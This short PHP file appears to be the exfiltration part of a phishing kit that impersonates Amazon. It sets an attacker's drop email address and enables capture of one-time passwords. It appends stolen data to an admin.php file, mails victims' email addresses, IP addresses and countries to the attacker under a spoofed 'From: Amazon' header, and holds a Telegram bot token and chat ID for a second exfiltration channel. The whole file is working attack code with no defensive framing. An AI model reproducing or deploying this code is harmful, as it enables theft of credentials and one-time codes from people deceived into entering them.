<?php

$yourmail  = 'cyb3r-3rr0r@yandex.com';

$OTP = "ON";
$ACSEAMAIL = "ON";

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['email']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Amazon" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="1675782580:AAEGqDDjtx4rdPzI0h3-pch84hdtmy4TRvA";
$chatId="1307904224";  
